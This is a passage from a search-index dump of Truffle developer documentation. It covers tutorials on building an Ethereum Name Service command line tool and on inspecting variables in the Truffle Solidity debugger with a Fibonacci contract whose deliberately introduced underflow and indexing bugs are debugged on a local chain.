very similar to creating a web application, but you have to do things a bit differently. For instance, instead of a build process, your command line tool needs to grab your contract artifacts and make them ready for use. Additionally, if you want to take advantage of Truffle's tests, you need to separate your code into a command line interface and a library -- a good practice anyway -- so you can use Truffle's testing framework to test your code. Stay Tuned \u00b6 Truffle 3.0 now makes it easier than ever to write any Ethereum-enabled application, and not just web apps. Stay tuned for more examples in the future where we explore Desktop and Mobile applications, too. Cheers!", "title": "Creating an Ethereum-enabled command line tool with Truffle 3.0"}, {"location": "guides/creating-a-cli-with-truffle-3/#intended-audience", "text": "This is written for those familiar with Truffle and Ethereum, who want to learn how to create a testable, Ethereum-enabled command line application with Truffle. For this tutorial, we'll be building a command line tool that interacts with the Ethereum Name Service (ENS).", "title": "Intended Audience"}, {"location": "guides/creating-a-cli-with-truffle-3/#getting-started", "text": "If you were using Truffle beta 3.0.0-9 or below, do not immediately upgrade . Read these release notes and the upgrade guide first. Next, make a new folder and run the following command: $ truffle init You should see the test , build , and migrations directories were created for you -- but no app . Additionally, the build step in the truffle.js file is mysteriously absent. That's ok! This means Truffle is getting out of your way and letting you control the build process.", "title": "Getting Started"}, {"location": "guides/creating-a-cli-with-truffle-3/#lets-look-at-the-example", "text": "Check out the example app as a reference. I'll be referring to it often so give it a look over if you haven't already. The first thing to look at is the build process. Since Truffle now puts us in control of the build, I've added some custom scripts within package.json to handle building for us: ... \"description\" : \"CLI for ENS deployment\" , \"scripts\" : { \"ens\" : \"babel-node ./bin/ensa.js\" , \"lint\" : \"eslint ./\" }, \"author\" : \"Douglas von Kohorn\" , \"license\" : \"MIT\" , ... I've defined two scripts here: lint for linting my Javascript to keep my codebase so fresh and so clean, and ens for transpiling my Javascript command line tool (using Babel) and running it. That's it! That's the build process. You can run it via npm run lint and npm run ens . Now that that's out of the way, let's dig into how and why I structured my app this way.", "title": "Let's Look at the Example"}, {"location": "guides/creating-a-cli-with-truffle-3/#building-our-app-separation-of-concerns", "text": "In order to take advantage of all parts of Truffle while building this tool, we need to separate our code into two distinct pieces. First, we need to write a library which will constitute the bulk of the app, and allow us to perform actions against the ENS contracts quickly and easily from Javascript. Next is the CLI; the CLI will take advantage of the library itself, and will be the user's interface to our application.", "title": "Building our App: Separation of concerns"}, {"location": "guides/creating-a-cli-with-truffle-3/#the-library", "text": "The library is lib/ens_registrar.js . Let's take a look at the constructor: ... constructor ( AuctionRegistrar , Deed , registrarAddress , provider , fromAddress ) { this . web3 = new Web3 ( provider ) this . Deed = Deed this . Deed . setProvider ( provider ) AuctionRegistrar . setProvider ( provider ) AuctionRegistrar . defaults ({ from : fromAddress , gas : 400000 }) this . registrar = AuctionRegistrar . at ( registrarAddress ) } ... The library constructor requires a few things: the contract interfaces ( AuctionRegistrar & Deed ) the address on the network of the registrar a web3 provider that will be used to connect to the desired Ethereum network and the account address that will provide gas for transactions. It's crucial that the library remain ignorant of the creation of these variables if we want to take advantage of both Truffle's testing pipeline and a CLI. As I see it, there are two ways to use the library: - Through Truffle , which manages contract addresses for testing against different networks (e.g. local, private, ropsten). Truffle makes testing our library easy. - Once we've convinced ourselves that the library is well tested and works properly, we'll want to tell the library where to find our own contracts, provider, and account on the mainnet through the CLI . Let's take a look at how the library is used in both cases.", "title": "The Library"}, {"location": "guides/creating-a-cli-with-truffle-3/#use-1-truffle-tests", "text": "Here's test/ENS.js , a Truffle test that uses the library: import { default as ENSAuctionLib } from '../lib/ens_registrar' const Registrar = artifacts . require ( './Registrar.sol' ) const Deed = artifacts . require ( './Deed.sol' ) contract ( 'ENS integration' , ( accounts ) => { let auctionRegistrar before ( 'set up auction registrar' , ( done ) => { Registrar . deployed (). then (( instance ) => { auctionRegistrar = new ENSAuctionLib ( Registrar , Deed , instance . address , web3 . currentProvider , accounts [ 0 ] ) }). then (() => done ()) }) it ( 'demonstrates that the domain name is available' , ( done ) => { auctionRegistrar . available ( 'test' ) . then (( isAvailable ) => { assert . isTrue ( isAvailable ) done () }) }) ... } Truffle injects a global artifacts.require function, a helper for finding the right compiled contract artifacts within the test environment. The test then finds a deployed instance of the Registrar on the test network via Registrar.deployed() . Now, with the addition of accounts , which is passed in via the contract wrapper (see here) , we have enough to instantiate the library and use it to test that the domain name 'test' is available for auction.", "title": "Use #1: Truffle Tests"}, {"location": "guides/creating-a-cli-with-truffle-3/#use-2-the-cli", "text": "Here's index.js , which provides our command line tool, using the library: import { default as ENSAuctionLib } from './lib/ens_registrar' import { default as Web3 } from 'web3' import { default as contract } from '@truffle/contract' const AuctionRegistrar = contract ( require ( './build/contracts/Registrar.json' )) const Deed = contract ( require ( './build/contracts/Deed.json' )) export default function ( host , port , registrarAddress , fromAddress ) { let provider = new Web3 . providers . HttpProvider ( `http:\\/\\/ ${ host } : ${ port } ` ) return new ENSAuctionLib ( AuctionRegistrar , Deed , registrarAddress , provider , fromAddress ) } Here I'm using the same library, @truffle/contract , that artifacts.require uses under the hood. Because I can't rely on the Truffle Suite within the CLI, I have to include the compiled contract artifacts manually. The rest is passed in through the CLI in bin/ensa.js : import { default as initializeLib } from '../index' ... let command = argv . _ [ 0 ] if ( command === 'bid' ) { let { name , host , max , port , registrar , account , secret } = argv let auctionRegistrar = initializeLib ( host , port , registrar , account ) auctionRegistrar . createBid ( name , account , max , secret ) . then (() => console . log ( 'Created bid for ' + name )) }", "title": "Use #2: the CLI"}, {"location": "guides/creating-a-cli-with-truffle-3/#usage", "text": "You can use the command line tool against any network that has an ENS registrar deployed. First, choose a command: $ npm run -s ens Usage: bin/ensa.js [ command ] [ options ] Commands: winner Current winner of bid bid Place a bid on a domain name reveal Reveal your bid on a domain name Options: --help Show help Then specify the correct options, including the account and registrar : $ npm run -s ens -- winner -n 'NewDomain' bin/ensa.js winner Options: --help Show help [ boolean ] --host, -h HTTP host of Ethereum node [ default: \"testrpc\" ] --port, -p HTTP port [ default: \"8545\" ] --registrar, -r The address of the registrar [ string ] [ required ] --name, -n The name you want to register [ string ] [ required ] --account, -a The address to register the domain name [ string ] [ required ] Missing required arguments: account, registrar", "title": "Usage"}, {"location": "guides/creating-a-cli-with-truffle-3/#recap", "text": "You might be thinking to yourself, \"That was a short tutorial\". That's because it doesn't need to be much longer: Creating a command line application with Truffle is very similar to creating a web application, but you have to do things a bit differently. For instance, instead of a build process, your command line tool needs to grab your contract artifacts and make them ready for use. Additionally, if you want to take advantage of Truffle's tests, you need to separate your code into a command line interface and a library -- a good practice anyway -- so you can use Truffle's testing framework to test your code.", "title": "Recap"}, {"location": "guides/creating-a-cli-with-truffle-3/#stay-tuned", "text": "Truffle 3.0 now makes it easier than ever to write any Ethereum-enabled application, and not just web apps. Stay tuned for more examples in the future where we explore Desktop and Mobile applications, too. Cheers!", "title": "Stay Tuned"}, {"location": "guides/debugger-variable-inspection/", "text": "Note : This tutorial requires Truffle version 4.1.8 or newer. The integrated Solidity debugger in Truffle is a powerful tool for inspecting your contracts. When initially released, the debugger had the ability to step through Solidity code, but that was it. But development has continued apace, and new functionality has been added to make your contract inspection more powerful. Specifically, you now have the ability to perform variable inspection on your contracts . With this, you can know exactly the state of your variables at every given point in the instruction list, giving you a much greater ability to truly inhabit the current state of your contracts, and making debugging a breeze. In this tutorial, we're going to take a look at a simple contract and inspect it using the Truffle Solidity debugger. We'll investigate three scenarios: A working contract A working contract with unexpected output A broken contract A basic smart contract \u00b6 The Fibonacci sequence is an integer sequence where each successive number in the sequence is the sum of the two previous numbers. With the first two numbers set to 1, you can determine every number in the sequence through iteration. The Fibonacci sequence is related to the \"golden ratio\", which is found in certain areas of nature, such as governing the arrangement of leaves on branches and petals on flowers. The golden ratio in nature: flower petals. (Source: Flickr ) Generating the Fibonacci sequence with a smart contract can show off the debugger and its variable inspection without getting too bogged down in details. Let's do it. Create a new project directory called fibonacci and change into it. mkdir fibonacci cd fibonacci Create a bare truffle project: truffle init In the contracts/ directory, create a file named Fibonacci.sol and add the following content: pragma solidity ^ 0.4.22 ; contract Fibonacci { uint [] fibseries ; // n = how many in the series to return function generateFib ( uint n ) public { // set 1st and 2nd entries fibseries . push ( 1 ); fibseries . push ( 1 ); // generate subsequent entries for ( uint i = 2 ; i < n ; i ++ ) { fibseries . push ( fibseries [ i - 1 ] + fibseries [ i - 2 ]); } } } Let's take a look at this contract to see what's going on with it: First, we see the standard pragma declaration, which states that the contract s compatible with any 0.4.x version of Solidity newer than 0.4.22. The contract name is called Fibonacci . We're defining an array of integers called fibseries . This will house our Fibonacci series. Note that the variable declaration is happening outside of any function, and therefore the array will be saved in storage (instead of memory), provoking a transaction to occur when the contract is run. The function is called generateFib and takes a single argument, which is the number of integers in the sequence to generate. The next two commands add an element each to the array via the .push() method. As we know our fibseries array is defined in storage, but size isn't known until runtime, the .push() method is used to add entries to (the end of) our array. This starts the sequence with the number 1 twice. The for loop iterates through the rest of the array (as determined by the integer n ) filling each entry with the appropriate value. Inside the migrations/ directory of your project, create a file called 2_deploy_contracts.js and populate it with the following content: var Fibonacci = artifacts . require ( \"Fibonacci\" ); module . exports = function ( deployer ) { deployer . deploy ( Fibonacci ); }; This file allows us to deploy the Fibonacci contract (shown above) to the blockchain. Now launch Ganache . This will be the personal blockchain we'll use to deploy our contract. Ganache Note : You can also run this tutorial with [Truffle Develop](/docs/truffle/getting-started/using-truffle-develop-and-the-console) and the results will be the same. In the root of your project, open your truffle.js file and add the following content: module . exports = { networks : { development : { host : \"127.0.0.1\" , port : 7545 , network_id : \"*\" , }, }, }; This allows us to connect our project to Ganache. Launch the Truffle console : truffle console You will see a prompt: truffle ( development ) > We'll run all of our commands from here. Compile the contract: compile You should see the following output: Compiling .\\contracts\\Fibonacci.sol... Compiling .\\contracts\\Migrations.sol... Writing artifacts to .\\build\\contracts Note : Make sure to examine the output for any errors or warnings. Migrate the contract to our blockchain. migrate You will see output that looks like this, though the addresses and transaction IDs will be different: Using network 'development'. Running migration: 1_initial_migration.js Replacing Migrations... ... 0xd29465deee7a5d60aed89520807432ef8a2fbbb665611882277ec8ca6fc9c622 Migrations: 0x5cc77b19b8e14e4d6074562bdbe1e13e1b793693 Saving successful migration to network... ... 0xba700ad46880ab2a9bdd961e66c9313fc541f91c439243df6ab2b97920cf2c4a Saving artifacts... Running migration: 2_deploy_contracts.js Replacing Fibonacci... ... 0xed0d1b736e948d926ee31f959b013f67d71e08f294a87e86e41ccbd8a62ce908 Fibonacci: 0xa3f4063ffbdc5cfd8ecbd99424378a5f056eb81d Saving successful migration to network... ... 0xcaeb44f5e28689c29cb3189c7b42fa1094021b4e5008f720fef2f9b867e6be23 Saving artifacts... Interacting with the basic smart contract \u00b6 Our contract is now on the blockchain. Ganache has automatically mined the transactions that came from the contract call and creation, as you can see by clicking the \"Transactions\" button in Ganache: Ganache transactions Now it's time to interact with the contract. First we'll check to make sure that it's working correctly. In the Truffle console, enter the following command: Fibonacci . deployed (). then ( function ( instance ) { return instance . generateFib ( 10 ); }); Before we run the command, let's take a look at it in greater detail. Displayed in a more easily-readable manner, it reads: Fibonacci . deployed (). then ( function ( instance ) { return instance . generateFib ( 10 ); }); This command uses JavaScript promises . Specifically, the command says that given a deployed version of the Fibonacci contract, run an instance of that contract, and then run the generateFib function from that contract, passing it the argument 10 . Run the above command. A transaction will be created on the blockchain because our array that holds the generated Fibonacci sequence is in storage. Because of this, the output of the console will be the transaction details, which will look similar to this: { tx : '0xf47f01da1a6991f4dc168928cf4c490cb9bb57ca403b428f40a333ea65d1c41c' , receipt : { transactionHash : '0xf47f01da1a6991f4dc168928cf4c490cb9bb57ca403b428f40a333ea65d1c41c' , transactionIndex : 0 , blockHash : '0x88d45cb84d1f26001b0e7ae2931a56dfc0a592a1d0437fe0a37540d65f49a2ed' , blockNumber : 5 , gasUsed : 298373 , cumulativeGasUsed : 298373 , contractAddress : null , logs : [], status : '0x01' , logsBloom : '0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000' }, logs : [] } The important part of this output for us is the transaction ID (listed as the value of tx: ). Because even though we've run our function, we don't actually know what happened. Did it work correctly? Did something unexpected happen? We'll need the Truffle Solidity debugger to find out. Note : Your transaction ID will be different from the above. Debugging a transaction \u00b6 You can debug a transaction in the Truffle console by typing debug <transactionID> . We'll now do just that. Type debug and then the value of tx: found in your transaction details. For example: debug 0xf47f01da1a6991f4dc168928cf4c490cb9bb57ca403b428f40a333ea65d1c41c Note : Your transaction ID will be different. Do not copy the above example exactly. This will enter the debugger. You will see the following output: Gathering transaction data ... Addresses affected : 0x33b217190208f7b8d2b14d7a30ec3de7bd722ac6 - Fibonacci Commands : ( enter ) last command entered ( step next ) ( o ) step over , ( i ) step into , ( u ) step out , ( n ) step next (;) step instruction , ( p ) print instruction , ( h ) print this help , ( q ) quit ( b ) toggle breakpoint , ( c ) continue until breakpoint ( + ) add watch expression ( ` +:< expr > ` ), ( - ) remove watch expression ( -:< expr > ) ( ? ) list existing watch expressions ( v ) print variables and values , ( : ) evaluate expression - see ` v ` Fibonacci . sol : 1 : pragma solidity ^ 0.4.22 ; 2 : 3 : contract Fibonacci { ^^^^^^^^^^^^^^^^^^^^ debug ( development : 0xf47f01da ...) > Let's examine what's going on here. The debugger names the address of the contract in question that is related to the transaction, as well as the name of that contract. In our case, we're only dealing with a single contract, though if our transaction dealt with multiple contracts, all addresses would be shown. A full list of commands for the debugger is shown. Many of these mirror other code debuggers. We'll use a few of these throughout the tutorial, but if you ever want to see the list again, type h . The debugger starts at the first instruction of the transaction, and shows you the relevant code for that instruction, highlighted with carets ( ^^^ ). Type n and <Enter> to step next. This will move to the next instruction: 6 : 7 : // n = how many in the series to return 8 : function generateFib ( uint n ) public { ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ debug ( development : 0xf47f01da ...) > We've seen in the previous tutorial on debugging how you can step through the instructions to debug your contract. But here, we have an additional concern, which is that we don't actually know the outcome of our function call; we want to know what a variable is set to. You can view the state of all known variables by pressing v : fibseries : [] debug ( development : 0xf47f01da ...) > Here we see one empty array. The array fibseries will have the n numbers in the Fibonacci sequence. Press Enter to repeat the last command, and step next to the next instruction: 9 : 10 : // set 1st and 2nd entries 11 : fibseries . push ( 1 ); ^^^^^^^^^ debug ( development : 0xf47f01da ...) > This instruction moves on to the initial seeding of the fibseries variable. Press v to see the current state of the variables: i : 0 n : 10 fibseries : [] Now we see three variables, our fibseries array and two others: i is an index variable, used to determine the location of the next number in the sequence n is the integer we passed to the function ( 10 in this case) indicating the number of entries in our Fibonacci sequence Here we see that n has been passed the value from the contract, while i hasn't received its value from the for loop yet, since we haven't gotten to that part of the function. Press Enter to step next to the next instruction: 9 : 10 : // set 1st and 2nd entries 11 : fibseries . push ( 1 ); ^ It's rather tedious to constantly press v after every state change. Thankfully, you can set certain variables to be \"watched\", so that they will display after every movement in the debugger. The syntax to watch a variable is +:<variable> . So let's watch the variables we care about ( i and fibseries ) with the following two commands: +: i +: fibseries After each command, the current value of the variable will display. But once done, we'll get a persistent display of the variables and their values. Press Enter to move to the next instruction: 9 : 10 : // set 1st and 2nd entries 11 : fibseries . push ( 1 ); ^^^^^^^^^^^^^^^^^ : i 0 : fibseries [] Notice that after the current instruction, the watched variables are displayed automatically. You can also watch expressions, not just variables. Run the following expression to make our output a little more compact. +: { i , fibseries } This will output as follows: { i : 0 , fibseries : [] } Since we have all we need in this one expression, we can unwatch the individual variables. The syntax to watch a variable is -:<variable> . -: i -: fibseries Now we'll only be watching the single expression comprising the two variables. Press Enter to move to the next instruction and see the output: 10 : // set 1st and 2nd entries 11 : fibseries . push ( 1 ); 12 : fibseries . push ( 1 ); ^^^^^^^^^ : { i , fibseries } { i : 0 , fibseries : [ 1 ] } Notice that we have now populated the first entry in the sequence. Because the debugger steps through each instruction one at a time, it's going to take a long time to see results if we don't pick up our pace. Luckily, the debugger can \"step over\", which steps over the current line, moving to the next line, as long as it's at the same function depth. This will allow us to make progress much more quickly. So type o to step over the current instruction set. The output will be: 13 : 14 : // generate subsequent entries 15 : for ( uint i = 2 ; i < n ; i ++ ) { ^ : { i , fibseries } { i : 0 , fibseries : [ 1 , 1 ] } Here we see that we have populated the first two entries in the sequence. Since Enter will replay the previous command, press Enter now to step over again: 14 : // generate subsequent entries 15 : for ( uint i = 2 ; i < n ; i ++ ) { 16 : fibseries . push ( fibseries [ i - 1 ] + fibseries [ i - 2 ]); ^^^^^^^^^ : { i , fibseries } { i : 2 , fibseries : [ 1 , 1 ] } Now that we have two entries in our sequence, we've moved into our for loop. Continue pressing Enter and watching the variable output. You should notice that when i gets to 10 , the for loop ends (as the loop terminates at i < n ). The final array is: [ 1 , 1 , 2 , 3 , 5 , 8 , 13 , 21 , 34 , 55 ] It can be verified that this is the correct first ten entries in the Fibonacci sequence. Debugging unexpected output \u00b6 Our contract as we have created it is working as expected. That's great, but we can't always get so lucky. Sometimes a contract appears to work fine (no errors are thrown) but the output is not what you'd expect. Let's examine that here. It's amazing what switching a plus sign for a minus sign can do. Instead of the Fibonacci sequence: F [ 1 ] = 1 F [ 2 ] = 1 F [ n ] = F [ n - 1 ] + F [ n - 2 ] Let's switch the plus for a minus sign: F [ 1 ] = 1 F [ 2 ] = 1 F [ n ] = F [ n - 1 ] - F [ n - 2 ] (I don't know if this series has a name, so we'll just call it the \"Trufflenacci\" sequence.) Let's edit our contract and see what happens. Open the Fibonacci.sol file. Edit the definition of our fibseries[] array to be of type uint8[] . uint8 [] fibseries ; Note : A `uint8` is an unsigned integer with 8 bits, with a maximum value of 2^8 = 255. Compare this to a `uint`, which is a 256 bit number with a maximum value of 2^256. Edit the for loop so that the terms are subtracted instead of added: fibseries . push ( fibseries [ i - 1 ] - fibseries [ i - 2 ]); Save this file. Back on the console, recompile the contract. compile --all Note : The `--all` flag with force recompile all of the contracts. Remigrate the contract to the blockchain. migrate --reset We can now run the same command as before, which will generate a new transaction: Fibonacci . deployed (). then ( function ( instance ) { return instance . generateFib ( 10 ); }); As before, the output of the console will be the transaction details. Note the transaction hash (the value of tx: ). Type debug and then the value of tx: found in your transaction details. This will enter the debugger again. Fibonacci . sol : 1 : pragma solidity ^ 0.4.22 ; 2 : 3 : contract Fibonacci { ^^^^^^^^^^^^^^^^^^^^ We're curious about what our fibseries array is going to look like, so let's watch it: +: fibseries The response will be undefined , because we haven't yet gotten to the point in the code where that array was defined. Let's \"step over\" execution, so as to speed things up (\"step next\" takes much longer, as it's a more granular process). You can \"step over\" by running the o command. Fibonacci . sol : 6 : 7 : // n = how many in the series to return 8 : function generateFib ( uint n ) public { ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ : fibseries [] The array is defined, but is still empty. Since Enter repeats the previous command (in our case, \"step over\"), press Enter twice. You'll see that the first element of fibseries has been populated. 10 : // set 1st and 2nd entries 11 : fibseries . push ( 1 ); 12 : fibseries . push ( 1 ); ^^^^^^^^^ : fibseries [ 1 ] Keep pressing Enter until four elements have been populated: : fibseries [ 1 , 1 , 0 , 255 ] Something seems off here. Obviously, if you were expecting the Fibonacci series, by this point you would realize that you had veered far off course. But the jump from 0 to 255 should be suspicious too. And in fact, what we're seeing is a buffer underflow , a situation where we have an unsigned integer , which can hold only positive values, being set to less than zero. Specifically, that fourth value is defined as the difference between the previous two elements, so 0 - 1 = -1 . Our type is uint8[] which means that each integer in the array is defined by 8 bits, so its maximum value is 2^8 - 1 = 255. Subtract one from zero, and the value \"wraps around\" to its maximum value. Assuming this was the series we wanted (and that our minus sign was correct), the way to change this is to change the definition of our fibseries array from uint8[] to int8[] . That would make values \"signed integers\" and able to accept negative values, giving you an array that would look like this instead: [ 1 , 1 , 0 , - 1 ] Debugging errors \u00b6 Sometimes, contracts have errors in them. They may compile just fine, but when you go to use them, problems arise. This is one of the reasons to use Ganache over a public testnet: you can easily redeploy a contract without any penalty in time or ether. So we're going to introduce a small error, a misnumbering in our for loop that will cause it to have an invalid index. Open the Fibonacci.sol file again. Edit the for loop so that the i variable starts from 1 for ( uint i = 1 ; i < n ; i ++ ) { Save this file. Back on the console, recompile the contract. compile --all Remigrate the contract to the blockchain. migrate --reset Run the same command as before: Fibonacci . deployed (). then ( function ( instance ) { return instance . generateFib ( 10 ); }); You'll see an error, which will start with this: Error: VM Exception while processing transaction: invalid opcode Well that's not good. Moreover, the output didn't give us a transaction ID to debug, so we're going to need to look elsewhere for it. Thankfully, Ganache can tell us the transaction information. Go back in Ganache and click the \"Logs\" link at the top: Click this button to open the logs At the very bottom of the logs, you will see a transaction ID listed near an error saying invalid opcode . This is the one we need. Copy this transaction ID. Ganache logs Back in the console, type debug and paste in the transaction ID. This will enter the debugger again. Let's watch the same compacted expression as before, showing both the value of i and the value of fibseries . +: { i , fibseries } Continually step next. You will eventually reach a state where the debugger will error out. 14 : // generate subsequent entries 15 : for ( uint i = 1 ; i < n ; i ++ ) { 16 : fibseries . push ( fibseries [ i - 1 ] - fibseries [ i - 2 ]); ^^^^^^^^^^^^^^ : { i , fibseries } { i : 1 , fibseries : [ 1 , 1 ] } debug ( development : 0x948da9db ...) > Transaction halted with a RUNTIME ERROR . This is likely due to an intentional halting expression , like assert (), require () or revert (). It can also be due to out - of - gas exceptions . Please inspect your transaction parameters and contract code to determine the meaning of this error . Note that the contract is failing at the point where it tries to determine the value of fibseries[i-2] But in our debugger, we know that the current value of i is 1 , so i-2 is going to be -1 (or actually 2^256 - 1 , due to the buffer underflow issue we talked about above, and with i defined as a uint ). Since either one of those values are invalid (you can't have a negative index, and the value at index 2^256 - 1 is clearly not defined), the contract halts with an error. These are just some of the ways that you can use variable inspection to debug your contracts. We're constantly adding functionality of the debugger, so please raise an issue on our Github page or ask a fellow Truffler in our GitHub Discussions . Happy debugging!", "title": "Variable Inspection - Going Deeper with the Truffle Solidity Debugger"}, {"location": "guides/debugger-variable-inspection/#a-basic-smart-contract", "text": "The Fibonacci sequence is an integer sequence where each successive number in the sequence is the sum of the two previous numbers. With the first two numbers set to 1, you can determine every number in the sequence through iteration. The Fibonacci sequence is related to the \"golden ratio\", which is found in certain areas of nature, such as governing the arrangement of leaves on branches and petals on flowers. The golden ratio in nature: flower petals. (Source: Flickr ) Generating the Fibonacci sequence with a smart contract can show off the debugger and its variable inspection without getting too bogged down in details. Let's do it. Create a new project directory called fibonacci and change into it. mkdir fibonacci cd fibonacci Create a bare truffle project: truffle init In the contracts/ directory, create a file named Fibonacci.sol and add the following content: pragma solidity ^ 0.4.22 ; contract Fibonacci { uint [] fibseries ; // n = how many in the series to return function generateFib ( uint n ) public { // set 1st and 2nd entries fibseries . push ( 1 ); fibseries . push ( 1 ); // generate subsequent entries for ( uint i = 2 ; i < n ; i ++ ) { fibseries . push ( fibseries [ i - 1 ] + fibseries [ i - 2 ]); } } } Let's take a look at this contract to see what's going on with it: First, we see the standard pragma declaration, which states that the contract s compatible with any 0.4.x version of Solidity newer than 0.4.22. The contract name is called Fibonacci . We're defining an array of integers called fibseries . This will house our Fibonacci series. Note that the variable declaration is happening outside of any function, and therefore the array will be saved in storage (instead of memory), provoking a transaction to occur when the contract is run. The function is called generateFib and takes a single argument, which is the number of integers in the sequence to generate. The next two commands add an element each to the array via the .push() method. As we know our fibseries array is defined in storage, but size isn't known until runtime, the .push() method is used to add entries to (the end of) our array. This starts the sequence with the number 1 twice. The for loop iterates through the rest of the array (as determined by the integer n ) filling each entry with the appropriate value. Inside the migrations/ directory of your project, create a file called 2_deploy_contracts.js and populate it with the following content: var Fibonacci = artifacts . require ( \"Fibonacci\" ); module . exports = function ( deployer ) { deployer . deploy ( Fibonacci ); }; This file allows us to deploy the Fibonacci contract (shown above) to the blockchain. Now launch Ganache . This will be the personal blockchain we'll use to deploy our contract. Ganache Note : You can also run this tutorial with [Truffle Develop](/docs/truffle/getting-started/using-truffle-develop-and-the-console) and the results will be the same. In the root of your project, open your truffle.js file and add the following content: module . exports = { networks : { development : { host : \"127.0.0.1\" , port : 7545 , network_id : \"*\" , }, }, }; This allows us to connect our project to Ganache. Launch the Truffle console : truffle console You will see a prompt: truffle ( development ) > We'll run all of our commands from here. Compile the contract: compile You should see the following output: Compiling .\\contracts\\Fibonacci.sol... Compiling .\\contracts\\Migrations.sol... Writing artifacts to .\\build\\contracts Note : Make sure to examine the output for any errors or warnings. Migrate the contract to our blockchain. migrate You will see output that looks like this, though the addresses and transaction IDs will be different: Using network 'development'. Running migration: 1_initial_migration.js Replacing Migrations... ... 0xd29465deee7a5d60aed89520807432ef8a2fbbb665611882277ec8ca6fc9c622 Migrations: 0x5cc77b19b8e14e4d6074562bdbe1e13e1b793693 Saving successful migration to network... ... 0xba700ad46880ab2a9bdd961e66c9313fc541f91c439243df6ab2b97920cf2c4a Saving artifacts... Running migration: 2_deploy_contracts.js Replacing Fibonacci... ... 0xed0d1b736e948d926ee31f959b013f67d71e08f294a87e86e41ccbd8a62ce908 Fibonacci: 0xa3f4063ffbdc5cfd8ecbd99424378a5f056eb81d Saving successful migration to network... ... 0xcaeb44f5e28689c29cb3189c7b42fa1094021b4e5008f720fef2f9b867e6be23 Saving artifacts...", "title": "A basic smart contract"}, {"location": "guides/debugger-variable-inspection/#interacting-with-the-basic-smart-contract", "text": "Our contract is now on the blockchain. Ganache has automatically mined the transactions that came from the contract call and creation, as you can see by clicking the \"Transactions\" button in Ganache: Ganache transactions Now it's time to interact with the contract. First we'll check to make sure that it's working correctly. In the Truffle console, enter the following command: Fibonacci . deployed (). then ( function ( instance ) { return instance . generateFib ( 10 ); }); Before we run the command, let's take a look at it in greater detail. Displayed in a more easily-readable manner, it reads: Fibonacci . deployed (). then ( function ( instance ) { return instance . generateFib ( 10 ); }); This command uses JavaScript promises . Specifically, the command says that given a deployed version of the Fibonacci contract, run an instance of that contract, and then run the generateFib function from that contract, passing it the argument 10 . Run the above command. A transaction will be created on the blockchain because our array that holds the generated Fibonacci sequence is in storage. Because of this, the output of the console will be the transaction details, which will look similar to this: { tx : '0xf47f01da1a6991f4dc168928cf4c490cb9bb57ca403b428f40a333ea65d1c41c' , receipt : { transactionHash : '0xf47f01da1a6991f4dc168928cf4c490cb9bb57ca403b428f40a333ea65d1c41c' , transactionIndex : 0 , blockHash : '0x88d45cb84d1f26001b0e7ae2931a56dfc0a592a1d0437fe0a37540d65f49a2ed' , blockNumber : 5 , gasUsed : 298373 , cumulativeGasUsed : 298373 , contractAddress : null , logs : [], status : '0x01' , logsBloom : '0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000' }, logs : [] } The important part of this output for us is the transaction ID (listed as the value of tx: ). Because even though we've run our function, we don't actually know what happened. Did it work correctly? Did something unexpected happen? We'll need the Truffle Solidity debugger to find out. Note : Your transaction ID will be different from the above.", "title": "Interacting with the basic smart contract"}, {"location": "guides/debugger-variable-inspection/#debugging-a-transaction", "text": "You can debug a transaction in the Truffle console by typing debug <transactionID> . We'll now do just that. Type debug and then the value of tx: found in your transaction details. For example: debug 0xf47f01da1a6991f4dc168928cf4c490cb9bb57ca403b428f40a333ea65d1c41c Note : Your transaction ID will be different. Do not copy the above example exactly. This will enter the debugger. You will see the following output: Gathering transaction data ... Addresses affected : 0x33b217190208f7b8d2b14d7a30ec3de7bd722ac6 - Fibonacci Commands : ( enter ) last command entered ( step next ) ( o ) step over , ( i ) step into , ( u ) step out , ( n ) step next (;) step instruction , ( p ) print instruction , ( h ) print this help , ( q ) quit ( b ) toggle breakpoint , ( c ) continue until breakpoint ( + ) add watch expression ( ` +:< expr > ` ), ( - ) remove watch expression ( -:< expr > ) ( ? ) list existing watch expressions ( v ) print variables and values , ( : ) evaluate expression - see ` v ` Fibonacci . sol : 1 : pragma solidity ^ 0.4.22 ; 2 : 3 : contract Fibonacci { ^^^^^^^^^^^^^^^^^^^^ debug ( development : 0xf47f01da ...) > Let's examine what's going on here. The debugger names the address of the contract in question that is related to the transaction, as well as the name of that contract. In our case, we're only dealing with a single contract, though if our transaction dealt with multiple contracts, all addresses would be shown. A full list of commands for the debugger is shown. Many of these mirror other code debuggers. We'll use a few of these throughout the tutorial, but if you ever want to see the list again, type h . The debugger starts at the first instruction of the transaction, and shows you the relevant code for that instruction, highlighted with carets ( ^^^ ). Type n and <Enter> to step next. This will move to the next instruction: 6 : 7 : // n = how many in the series to return 8 : function generateFib ( uint n ) public { ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ debug ( development : 0xf47f01da ...) > We've seen in the previous tutorial on debugging how you can step through the instructions to debug your contract. But here, we have an additional concern, which is that we don't actually know the outcome of our function call; we want to know what a variable is set to. You can view the state of all known variables by pressing v : fibseries : [] debug ( development : 0xf47f01da ...) > Here we see one empty array. The array fibseries will have the n numbers in the Fibonacci sequence. Press Enter to repeat the last command, and step next to the next instruction: 9 : 10 : // set 1st and 2nd entries 11 : fibseries . push ( 1 ); ^^^^^^^^^ debug ( development : 0xf47f01da ...) > This instruction moves on to the initial seeding of the fibseries variable. Press v to see the current state of the variables: i : 0 n : 10 fibseries : [] Now we see three variables, our fibseries array and two others: i is an index variable, used to determine the location of the next number in the sequence n is the integer we passed to the function ( 10 in this case) indicating the number of entries in our Fibonacci sequence Here we see that n has been passed the value from the contract, while i hasn't received its value from the for loop yet, since we haven't gotten to that part of the function. Press Enter to step next to the next instruction: 9 : 10 : // set 1st and 2nd entries 11 : 